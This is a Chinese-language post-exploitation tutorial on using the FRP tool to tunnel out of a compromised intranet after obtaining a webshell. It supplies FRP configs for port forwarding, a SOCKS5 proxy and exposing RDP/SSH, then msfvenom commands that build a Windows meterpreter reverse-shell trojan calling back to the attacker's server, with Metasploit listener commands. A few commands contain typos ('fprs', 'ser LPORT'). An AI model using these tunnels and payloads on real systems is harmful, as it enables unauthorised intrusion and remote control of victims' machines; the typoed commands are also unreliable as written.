内网穿透之FRP使用
2023-02-16 06:50:29

为什么要内网穿透

在获取到webshell权限进入内网后，我们需要进行内网渗透，但是有可能目标机器中没有我们需要的环境和工具等，上传工具与环境流量又会太大，那么我们可以利用内网穿透工具，把流量穿透到我们本机上，在我们本机上进行测试。

FRP

介绍

frp 是一个专注于内网穿透的高性能的反向代理应用，支持 TCP、UDP、HTTP、HTTPS 等多种协议。可以将内网服务以安全、便捷的方式通过具有公网 IP 节点的中转暴露到公网。

使用方式

项目地址：https://github.com/fatedier/frp

根据需求下载相应版本

下载下来后解压，解压完成后可以看见有着frps、frps.ini、frpc、frpc.ini这四个文件，其中frps和frps.ini是放在服务端，frpc和frpc、frpc.ini需要上传到目标靶机上。

查看frps.ini，进行配置端口，默认配置端口为7000（我这里改了端口），如果是放在服务器上的话，服务器上需要开放相应的端口。

[common]
bind_port = 7001

上传到服务器后，使用命令：./fprs -c ./frps.ini运行frps

查看frpc.ini，进行相应配置，server_addr填上服务器IP地址（如果你是本地搭建的，填为本地IP地址），server_port配置frps.ini上配置的端口，进行通信。

下面的配置中，[]中填写名称；type默认为tcp，根据相应需求也可以填写其他协议（如udp,http,https,stcp,xtcp）；local_ip填写本地地址;local_port填写本地端口；remote_port填写服务器端口。

[common]
server_addr = x.x.x.x
server_port = 7001

[web]
type = tcp
local_ip = 127.0.0.1
local_port = 6001
remote_port = 6000

配置完成后，通过webshell文件上传上传到目标靶机，然后使用命令：./frpc -c ./frpc.ini运行即可。

使用浏览器代理功能，配置好设置后，便能够直接直接访问内网的内容。

Socks5

也能够通过配置frpc.ini，进行srcks5代理，直接使用本机环境与工具进行测试。

[socks5]
type = tcp
plugin  =socks5
remote_port = 6060

使用proxifier进行socks5配置，配置文件》代理服务器

配置文件》代理规则

配置完成后，只要是访问192.168.3.*的IP地址，都会走代理。

RDP

通过配置frpc.ini文件，也能够直接通过远程服务，来连接目标靶机。填写服务器ip:端口来连接远程。同理，如果目标主机是linux，把端口改成22也能够通过linux的ssh来连接。

[RDP]
type = tcp
local_ip = 127.0.0.1
local_port = 3389
remote_port = 6000

MSF上线

进行frpc.ini配置，local_ip设为服务器的IP。

[MSF]
type = tcp
local_ip = x.x.x.x
local_port = 6677
remote_port = 6666

使用命令生成木马

msfvenom -p windows/meterpreter/reverse_tcp lhost=服务器IP lport=6666 -f exe -o frp.exe

服务器开启监听

use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
ser LPORT 6677
run

把木马文件上传到目标靶机上，运行即可上线。

如果服务器没有安装MSF，也能够通过配置，来进行本地上线。

把frpc和frpc.ini在本地kali运行，local_ip设为127.0.0.1。

本地使用命令生成木马

msfvenom -p windows/meterpreter/reverse_tcp lhost=服务器IP lport=6666 -f exe -o frp.exe

本地开启监听

use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
ser LPORT 6677
run

把木马文件上传到目标靶机上，运行即可上线。
